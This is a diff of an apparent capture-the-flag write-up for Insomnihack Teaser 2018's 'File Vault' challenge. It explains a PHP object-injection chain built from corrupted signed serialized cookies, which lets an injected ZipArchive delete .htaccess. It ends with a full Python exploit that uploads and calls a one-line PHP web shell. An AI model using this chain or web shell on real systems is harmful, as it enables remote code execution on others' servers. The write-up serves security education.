@@ -1,7 +1,7 @@
 ---
 layout: post
 title: File Vault
-category: insomnihack-teaser-2018
+category: Insomnihack-Teaser-2018
 ---
 
 # Description
@@ -12,13 +12,13 @@ You can securely store some of your files on our systems, and retrieve some data
 
 # The Challenge
 
-File Vault is a sandboxed file manager allowing users to upload files and
-view file metadata. This challenge has been my favorite during the Insomnihack
-Teaser. Even if the source code was provided, this challenge showed a lot of
+**File Vault** is a sandboxed file manager allowing users to upload files and
+view file metadata. This challenge has been my favorite during the **Insomnihack
+Teaser**. Even if the source code was provided, this challenge showed a lot of
 originality.
 
-As mentionned above, the challenge author provided us with the source code of the
-application. A user has access to five actions :
+As mentionned above, the challenge author provided us with the **source code** of the
+application. A user has access to five **actions** :
 
 - `home` (viewing the main page)
 - `upload` (uploading a new file)
@@ -26,14 +26,18 @@ application. A user has access to five actions :
 - `open` (viewing the metadata of an existing file)
 - `reset` (remove all files from the sandbox)
 
-Each action is executed in the context of a sandbox, a user-specific folder
+
+![main_page](/assets/img/insomnihack-teaser-2018/main.png)
+
+
+Each action is executed in the context of a **sandbox**, a user-specific folder
 generated with the following code :
 
 ```php
 $sandbox_dir = 'sandbox/'.sha1($_SERVER['REMOTE_ADDR']);
 ```
 
-That sandbox also prevents PHP execution, as shown by the `php_flag engine off`
+That sandbox also **prevents PHP execution**, as shown by the `php_flag engine off`
 directive in a generated `.htaccess` file :
 
 ```php
@@ -44,7 +48,7 @@ if(!is_file($sandbox_dir.'/.htaccess'))
   file_put_contents($sandbox_dir.'/.htaccess', "php_flag engine off");
 ```
 
-## How the Webapp Works
+# How the Webapp Works
 
 Each uploaded file is represented by a `VaultFile` object in PHP:
 
@@ -79,10 +83,10 @@ properties :
 When viewing a file via the `open` action, the `fakename` is used for display
 purposes. The actual file on the filesystem is the `realname`.
 
-The `VaultFile` object is then added to an array, serialized via a custom
-`s_serialize()` function and returned to the user through cookies.
-When a user wishes to view his files, the web app fetches the user'
-s cookie, deserializes the `VaultFile` object via `s_unserialized()`
+The `VaultFile` object is then added to an array, **serialized** via a custom
+`s_serialize()` function and returned to the user through a `file` **cookie**.
+When a user wishes to view his files, the web app fetches the user's
+cookie, **deserializes** the array of `VaultFile` objects via `s_unserialized()`
 and processes it accordingly.
 
 Here's is what a `VaultFile` object looks like :
@@ -137,22 +141,22 @@ case 'upload':
   break;
 ```
 
-At this point, its fair to assume that we're dealing with a PHP object injection
-vulnerability, as a user-controlled cookie is being sent straight to the `s_unserialize()` function.
+At this point, it's fair to assume that we're dealing with a **PHP object injection**
+vulnerability, since a user-controlled cookie is being sent straight to the `s_unserialize()` function.
 
-**Note**: I won't go into the details of how object injection works, but here is my go-to reference
+**Note**: I won't go into the details of how object injections work, but here is my go-to reference
 on the subject: [Practical PHP Object Injection](https://www.insomniasec.com/downloads/publications/Practical%20PHP%20Object%20Injection.pdf)
 
-## s_serialize() and s_unserialize()
+# s_serialize() and s_unserialize()
 
 Early in the challenge, I assumed that this would be a typical object
 serialization challenge. Yet upon reading the source code, I soon understood
 why only 5 teams so far solved it.
 
 Firstly, even if the `s_*serialize` functions _do_ accept user-controlled parameters,
-the serialied object is signed and validated against a `$secret`. In the event
-of an invalid signature in the `s_unserialize()` function, the unserialized
-object is never returned :
+the serialized object is **signed** and **validated** against a `$secret`. In
+the event of an invalid signature in the `s_unserialize()` function, the unserialized
+object is **never** returned :
 
 ```php
 function s_serialize($a, $secret) {
@@ -168,17 +172,17 @@ function s_unserialize($a, $secret) {
 }
 ```
 
-Therefore, we _can_ pass arbitrary PHP objects to `unserialize()`, but we _can't_
+Therefore, we can pass arbitrary PHP objects to `unserialize()`, but we can't
 manipulate them since they will never be returned.
 
 Furthermore, the source code doesn't disclose any magic methods such as `__wakeup()`
 or `__destruct()`, which means we won't be able to win just with the `unserialize()`
-call...
+call.
 
 Lastly, even if we did manage to forge properly signed serialized objects, there are
-no methods allowing us to arbitrarly read/write files.
+**no methods allowing us to arbitrarly read/write files**.
 
-## The Bug - Corrupting Serialized Objects
+# The Bug - Corrupting Serialized Objects
 
 The vulnerability in the application, which makes this challenge so interesting,
 is in the following code :
@@ -191,9 +195,9 @@ function s_serialize($a, $secret) {
 };
 ```
 
-The author added `str_replace()` call to filter out `../` sequences. The issue
-here is that the `str_replace` call is performed on a *serialized object*,
-instead of a string.
+The author added a `str_replace()` call to filter out `../` sequences. The issue
+here is that the `str_replace` call is performed on a **serialized object**,
+instead of a **string**.
 
 Why does this matter? Here's a snippet of a serialized array.
 ```php
@@ -221,10 +225,10 @@ of its value :
 
 ```php
 a:2:{i:0;s:3:"./";i:1;s:5:"hello";}
-              --- <== The value parsed by unserialize() is ./"
+           ^  --- <== The value parsed by unserialize() is ./"
 ```
 
-The more `../` you add, the more characters end up being parsed by `unserialize()`.
+The more `../` you add, the **more** characters end up being parsed by `unserialize()`.
 
 ```php
 php > $array = array();
@@ -235,7 +239,7 @@ a:2:{i:0;s:36:"../../../../../../../../../../../../";i:1;s:5:"hello";}
 
 php > echo str_replace("../","./", serialize($array));
 a:2:{i:0;s:36:"././././././././././././";i:1;s:5:"hello";}
-               ------------------------------------ <=== Parsed by unserialize()
+           ^^  ------------------------------------ <=== Parsed by unserialize()
 
 php > unserialize('a:2:{i:0;s:36:"././././././././././././";i:1;s:5:"hello";}');
 PHP Notice:  unserialize(): Error at offset 51 of 58 bytes in php shell code on line 1
@@ -243,20 +247,23 @@ PHP Notice:  unserialize(): Error at offset 51 of 58 bytes in php shell code on 
 Notice: unserialize(): Error at offset 51 of 58 bytes in php shell code on line 1
 ```
 
-In the context of our challenge, we can reproduce this behavior by renaming
+In the context of our challenge, we can reproduce this behavior by **renaming**
 a previously uploaded file with a `../` sequence. The web application will
-happily rename and _sign_ a new cookie containing the corrupted object.
+happily rename and **sign** a new cookie containing the corrupted object.
 
-## Forging and Signing Arbitrary Objects
+# Forging and Signing Arbitrary Objects
 
 Now that we can **sign** corrupted serialized objects, we need to figure out
-how to sign _valid_ objects using this bug.
+how to sign **valid** objects using this bug.
 
 Notice how in the last example above, by adding multiple `../` strings, we
-end up overflowing on the next object (`"hello"`) in the array.
+end up **overflowing** on the **next object** (`"hello"`) in the array.
 
-In the event where we control the `hello` string, its just a matter
-of replacing `hello` with the end of a valid serialized object.
+In the event where we control the `hello` string, it's just a matter
+of replacing `hello` with the **a partial serialized object**.
+Think of it as SQL injection, where we must match the quotes on both ends
+to keep the query valid.
+
 Here's an example :
 
 ```php
@@ -281,12 +288,12 @@ Array
 
 As you can see, a new `"Injected"` string has been added to the array upon
 deserialization. We used a string in this example `"i:1;s:8:"Injected"`,
-but any primitive/object would work here too.
+but **any primitive/object** would work here too.
 
-In File Vault, we pretty much have the same situation. All we need is an array
-in which we corrupt the first object and we control the second object.
+In File Vault, we pretty much have the same situation. All we need is an **array**
+in which we **corrupt the first object** and we **control the second object**.
 
-We can achieve this by uploading two files. Just like the example
+We can achieve this by **uploading two files**. Just like the example
 above, the plan is the following :
 - Upload two files, creating two VaultFile objects
 - Rename the `fakename` of VaultFile #2 with a partial serialized object
@@ -296,16 +303,16 @@ above, the plan is the following :
 Note that since we're using the normal functionalities of the web app
 to do this, we don't have to worry about signing.
 
-### What now?
+# What now?
 
 We are now able to forge our own serialized objects with
 arbitrary data.
 
 At this point, the challenge becomes a typical object injection challenge,
-with the additional headaches of not having any magic methods or interesting
-functions...
+with the additional headaches of **not having any magic methods** or **interesting
+functions**...
 
-So far, we've used pretty much all of the features of the webapp with the exception
+So far, we've used pretty much all of the features in the webapp with the exception
 of one : `open`. Here is the implementation :
 
 ```php
@@ -318,18 +325,34 @@ case 'open':
   exit;
 ```
 
-`Open` essentially takes an object from our `$files` array and calls the
-`open()` function on it using two parameters : `$object->fakename` and
+`Open` essentially takes an **object** from our `$files` array and calls the
+`open()` function on it using **two parameters** : `$object->fakename` and
 `$object->realname`.
 
-Knowing that we can inject any object in our `$files` array (as demonstrated
+Knowing that we can inject **any object** in our `$files` array (as demonstrated
 by the `"Injected"` string from earlier), what would happen if we inject
 something other than a `VaultFile` object?
 
-The method name `open()` is pretty generic. There's bound to be a standard
-class in PHP which has an `open()` method. Since we can inject our own
-objects, we also control the parameters of the `open()` call
-(`fakename` and `realname`).
+The method name `open()` is pretty generic. If we are able to find a standard
+class in PHP which has an `open()` method, we can trick the webapp into
+calling the open() method of that class instead of the `VaultFile` method.
+
+Basically, instead of this behaviour :
+```php
+<?php
+$array = new array();
+$array[] = new VaultFile();
+$array[0]->open($array[0]->fakename, $array[0]->realname);
+```
+
+... we can trick the webapp to do this :
+
+```php
+<?php
+$array = new array();
+$array[] = new SomeOtherFile();
+$array[0]->open($array[0]->fakename, $array[0]->realname);
+```
 
 Let's list all classes containing an `open()` method :
 
@@ -353,24 +376,26 @@ XMLReader->open
 ZipArchive->open
 ```
 
-We have four classes which have an `open()` method. If we inject a serialized
-object of any one of these classes in our `$files` array, we can call
+We have four classes which have an `open()` method. If we **inject** a **serialized
+object** of any one of these classes in our `$files` array, we can call
 their method via the `open` action with the parameters of our choice.
 
-Most of these classes manipulate files. Thinking back to our challenge,
-the only file that is worth playing around with is the `.htaccess`
-preventing us from executing PHP. If we can somehow delete the
-`.htaccess` file, we win.
+Luckily for us, most of these classes **manipulate files**.
+Thinking back to our challenge, the only file worth playing around
+with is the `.htaccess` preventing us from **executing PHP**. If we can somehow
+delete the `.htaccess` file, we win.
 
-At this point, we can test locally the behavior of each class.
-_I_ noticed that the `ZipArchive->open` method **deletes* the target
-file if we give a `"9"` as a second parameter (don't ask me why...).
+At this point, we can locally test the behavior of each class.
+After some time, I noticed that the `ZipArchive->open` method **deletes** the target
+file if we give a `"9"` as a **second parameter** (don't ask me why...).
 
-## Getting a shell
+We should now be able to use ZipArchive->open() to delete the `.htaccess` file.
+
+# Getting a shell
 
 Let's develop our final payload.
 
-I created a python script to automate the actions of the web app.
+I created a **python script** to automate the actions of the web app.
 
 ```python
 #!/usr/bin/env python2
@@ -402,7 +427,7 @@ def open_file(index):
     return s.get(URL, params=params).text
 ```
 
-Let's prepare our VaultFile objects by uploading two files :
+Let's prepare our `VaultFile` objects by **uploading two files** :
 ```python
 upload("A")
 upload("B")
@@ -410,16 +435,12 @@ upload("B")
 
 The webapp will send us the following cookie :
 ```php
-a:2:{i:0;O:9:"VaultFile":2:{s:8:"fakename";s:1:"A";s:8:"realname";s:44:
-"911aaba06e0a1f2c3c8072f3390db020d7c82b7a.txt";}i:1;O:9:"VaultFile":2:
-{s:8:"fakename";s:1:"B";s:8:"realname";s:44:"911aaba06e0a1f2c3c8072f3
-390db020d7c82b7a.txt";}}ce27b112cf5429bf6f09a905de8f4d110ab1ce6d39f27
-d4ec0226ab47c76721a
+a:2:{i:0;O:9:"VaultFile":2:{s:8:"fakename";s:1:"A";s:8:"realname";s:44:"911aaba06e0a1f2c3c8072f3390db020d7c82b7a.txt";}i:1;O:9:"VaultFile":2:{s:8:"fakename";s:1:"B";s:8:"realname";s:44:"911aaba06e0a1f2c3c8072f3390db020d7c82b7a.txt";}}ce27b112cf5429bf6f09a905de8f4d110ab1ce6d39f27d4ec0226ab47c76721a
 ```
 
-Our malicious partial serialization object will be at the start of the second
-`fakename`. The distance between the first `fakename` and the second is 115
-characters.
+We want our malicious **partial** serialized object will be at the
+start of the **second** `fakename`. The distance between the first `fakename`
+and the second is 115 characters (count the distance between `"A"` and `"B"`).
 
 Therefore, to reach `fakename` #2, we need to rename the first
 `fakename` with `"../" * 115`. We'll do this later.
@@ -427,7 +448,7 @@ Therefore, to reach `fakename` #2, we need to rename the first
 
 ---
 
-We'll want to prepare a ZipArchive object to inject in this cookie.
+We'll want to prepare a `ZipArchive` object to inject in this cookie.
 Let's create one:
 
 ```php
@@ -438,17 +459,18 @@ php > echo serialize($zip);
 O:10:"ZipArchive":7:{s:8:"fakename";s:58:"sandbox/ea35676a8bfa0eeaac525ae05ab7fa2cce6616e2/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:0:"";}
 ```
 
-Since our goal is to call `ZipArchive->open(".htaccess", "9")`, we added a `fakename` and `realname` property containing our parameters.
+Since our goal is to call `ZipArchive->open(".htaccess", "9")`, we added a `fakename` and `realname` property containing the **parameters** we want to use.
 
-If we inject our object as is, we will be left with a trailing `realname`.
+If we inject our object as is, we will be left with a **trailing** `realname`.
 This might clash with the forged `realname` we created above.
 
 ```php
-";s:8:"realname";s:44:"911aaba06e0a1f2c3c8072f3390db020d7c82b7a.txt
+"...Our malicious ZipArchiver]";s:8:"realname";s:44:"911aaba06e0a1f2c3c8072f3390db020d7c82b7a.txt"
+                              ------------------------------(67 chars)---------------------------
 ```
 
 We can remove the trailing `realname` by updating the size of the serialized
-`ZipArchive->comment` parameter. The size of the trailing section is 67,
+`ZipArchive->comment` parameter. The size of the **trailing section** is 67,
 so we update the `comment` size accordingly.
 
 ```php
@@ -457,8 +479,8 @@ O:10:"ZipArchive":7:{s:8:"fakename";s:58:"sandbox/ea35676a8bfa0eeaac525ae05ab7fa
 
 ---
 
-We now have all the ingredients. Let's rename our second
-`VaultFile->fakename` :
+We now have all the ingredients. Let's **rename** our second
+`VaultFile->fakename`. Back to our python script :
 
 ```php
 # We end the first object with a dummy parameter, then start the second object
@@ -468,24 +490,90 @@ serialized_injection = '";s:1:"e";s:0:"";}i:1;O:10:"ZipArchive":7:{s:8:"fakename
 rename(1, serialized_injection)
 ```
 
-Let's now rename our first `VaultFile->fakename` :
+Let's now **rename** our first `VaultFile->fakename` :
 ```python
 newname = "../" * 115 # To overwrite fakename #2
 rename(0, newname)
 ```
 
-In the end, we'll receive the following cookie :
+In the end, we'll receive the following **cookie** :
 ```php
 a:2:{i:0;O:9:"VaultFile":2:{s:8:"fakename";s:345:"./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././";s:8:"realname";s:44:"911aaba06e0a1f2c3c8072f3390db020d7c82b7a.txt";}i:1;O:9:"VaultFile":2:{s:8:"fakename";s:245:"";s:1:"e";s:0:"";}i:2;O:10:"ZipArchive":7:{s:8:"fakename";s:58:"sandbox/ea35676a8bfa0eeaac525ae05ab7fa2cce6616e2/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:67:"";s:8:"realname";s:44:"911aaba06e0a1f2c3c8072f3390db020d7c82b7a.txt";}}6f72e63954ac6e08c3ebc6e4abdff60956a82d9ebc556873410c9ef456098b69
 ```
 
-Proceed to uploading a shell (which won't be executed as the .htaccess file
-has not been deleted yet):
+Proceed to **uploading** a **shell** (which won't be executed as the **.htaccess** file
+has **not been deleted yet**):
+
 ![before_shell](/assets/img/insomnihack-teaser-2018/before_shell.png)
 
-`Unserialize()` the cookie above and trigger the `ZipArchive->open()` function call :
+`Unserialize()` the **cookie** above and trigger the `ZipArchive->open()` function call :
+
 ![delete_htaccess](/assets/img/insomnihack-teaser-2018/delete_htaccess.png)
 
-And finally, revisit the shell again!
+And finally, revisit the **shell** again!
 
 ![shell](/assets/img/insomnihack-teaser-2018/after_shell.png)
+
+
+**FLAG : INS{gr4tz_f0r_y0ur_uns3ri4l1z1ng_tal3nts}**
+
+# Full Solution
+
+Here is my full solution in Python.
+
+```python
+#!/usr/bin/env python2
+
+import requests
+import urllib
+
+URL = "http://filevault.teaser.insomnihack.ch/"
+s = requests.Session()
+
+def upload(name, content="GARBAGE"):
+    files = {'vault_file': (name, content)}
+    params = { "action" : "upload" }
+    s.post(URL, params=params, files=files)
+
+def rename(index, new_name):
+    data = { "newname" : new_name }
+    params = {
+        "action" : "changename",
+        "i" : index
+    }
+    s.post(URL, params=params, data=data)
+
+def open_file(index):
+    params = {
+        "action" : "open",
+        "i" : index
+    }
+    return s.get(URL, params=params).text
+
+newname = "../" * 115 # To overwrite fakename #2
+serialized_injection = '";s:1:"e";s:0:"";}i:1;O:10:"ZipArchive":7:{s:8:"fakename";s:58:"sandbox/b630d75c8dcfee915aec97cc3bb5d1d4c782345b/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:67:"'
+
+# Upload 2 files
+upload("A")
+upload("B")
+
+# Rename to inject serialized ZipArchiver
+rename(1, serialized_injection)
+rename(0, newname)
+
+# Upload a shell
+upload("shell.php", "<?php system($_GET[cmd]); ?>")
+
+# Cookie received
+print " === Cookie === "
+print urllib.unquote(s.cookies['files'])
+
+# Trigger .htaccess removal
+open_file(1)
+
+shell_url = URL + "sandbox/b630d75c8dcfee915aec97cc3bb5d1d4c782345b/fe95113d494997061044e7142af542e84f3eebbf.php"
+
+response = requests.get(shell_url, params={"cmd" : "cat /flag"})
+flag = response.text
+print flag
+```
